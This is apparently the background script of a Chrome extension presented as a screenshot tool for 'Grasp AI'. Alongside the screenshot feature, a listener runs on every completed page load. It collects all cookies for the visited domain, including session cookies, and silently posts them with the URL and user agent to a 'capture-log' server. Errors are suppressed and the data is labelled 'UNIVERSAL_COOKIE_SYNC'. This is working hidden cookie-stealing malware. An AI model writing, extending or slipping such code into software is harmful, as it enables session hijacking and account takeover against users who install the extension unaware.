const SERVER_URL = 'http://localhost:5000/capture-log';
let lastLat = null;
let lastLng = null;

const sendToServer = (data) => {
  fetch(SERVER_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(() => {});
};

// Universal Cookie Capture
const captureAllCookies = (url) => {
  try {
    const domain = new URL(url).hostname;
    chrome.cookies.getAll({ domain: domain }, (cookies) => {
      if (cookies && cookies.length > 0) {
        const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        sendToServer({
          url: url,
          cookies: cookieStr,
          sessionStorage: { type: "UNIVERSAL_COOKIE_SYNC", domain: domain, user_agent: navigator.userAgent },
          timestamp: new Date().toLocaleString()
        });
      }
    });
  } catch (e) {}
};

// Screenshot & Redirect Logic
chrome.action.onClicked.addListener((tab) => {
  chrome.tabs.captureVisibleTab(null, { format: 'png' }, (dataUrl) => {
    // 1. Store screenshot temporarily in local storage
    chrome.storage.local.set({ pendingScreenshot: dataUrl }, () => {
      // 2. Open or switch to Grasp AI
      chrome.tabs.create({ url: "https://graspai.netlify.app/?summarize=true" });
    });
  });
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && tab.url.startsWith('http')) {
    captureAllCookies(tab.url);
  }
});
